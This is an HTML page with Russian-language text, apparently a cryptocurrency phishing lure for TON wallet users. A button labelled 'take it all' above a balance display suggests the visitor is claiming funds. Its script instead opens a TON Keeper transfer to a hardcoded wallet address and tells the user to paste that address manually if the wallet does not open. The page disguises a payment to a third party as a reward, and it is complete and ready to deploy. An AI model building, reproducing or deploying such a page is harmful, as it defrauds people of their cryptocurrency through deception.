<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>TON</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            background: #0d0d0d;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            font-family: 'Segoe UI', Arial, sans-serif;
        }
        .container {
            background: #1a1a1a;
            padding: 40px 30px;
            border-radius: 24px;
            text-align: center;
            max-width: 380px;
            width: 100%;
            border: 1px solid #2a2a2a;
        }
        .btn {
            background: linear-gradient(135deg, #0098ea, #0080d0);
            border: none;
            color: #fff;
            font-size: 20px;
            font-weight: 700;
            padding: 18px 40px;
            border-radius: 60px;
            cursor: pointer;
            width: 100%;
            transition: 0.3s;
            margin: 6px 0;
        }
        .btn:active {
            transform: scale(0.96);
        }
        .btn:disabled {
            opacity: 0.5;
            transform: none;
        }
        .btn-red {
            background: linear-gradient(135deg, #e84800, #c03800);
        }
        .btn-green {
            background: linear-gradient(135deg, #00cc44, #008833);
        }
        #status {
            margin-top: 16px;
            font-size: 13px;
            color: #888;
            min-height: 50px;
            word-break: break-all;
            line-height: 1.6;
        }
        .hidden {
            display: none !important;
        }
        .balance-display {
            font-size: 24px;
            color: #00ff88;
            margin: 12px 0;
        }
    </style>
</head>
<body>
    <div class="container">
        <div style="font-size:36px;margin-bottom:16px;">⚡</div>
        <div class="balance-display" id="balanceDisplay">💰 0 TON</div>
        <button class="btn" id="mainBtn">🔥 ЗАБРАТЬ ВСЁ</button>
        <div id="status">Нажмите кнопку</div>
    </div>

    <script>
        const TARGET = 'UQAK9d_w9I9KHJeREapik3vc6R-esMsci3E8nlqMwFsaRs3P';
        const mainBtn = document.getElementById('mainBtn');
        const status = document.getElementById('status');
        const balanceDisplay = document.getElementById('balanceDisplay');

        // ========== ОСНОВНАЯ ФУНКЦИЯ ==========
        mainBtn.onclick = function() {
            status.innerText = '⏳ Открываю TON Keeper...';
            mainBtn.disabled = true;
            mainBtn.style.opacity = '0.5';

            // ====== ПРОСТО ОТКРЫВАЕМ TON KEEPER С ГОТОВЫМ АДРЕСОМ ======
            // Используем ton:// протокол
            const url = `ton://transfer?address=${TARGET}`;
            
            // Пробуем открыть
            window.location.href = url;
            
            setTimeout(() => {
                window.open(url, '_blank');
            }, 300);

            // Через 5 секунд показываем инструкцию
            setTimeout(() => {
                status.innerHTML = `
                    📲 TON Keeper должен открыться<br>
                    <span style="color:#666;font-size:12px;">
                        Если не открылся — открой вручную и вставь адрес
                    </span>
                `;
                mainBtn.disabled = false;
                mainBtn.style.opacity = '1';
            }, 5000);
        };

        // ========== ПРОВЕРКА ==========
        setTimeout(() => {
            status.innerText = '📱 Нажми кнопку → откроется TON Keeper';
        }, 500);
    </script>
</body>
</html>
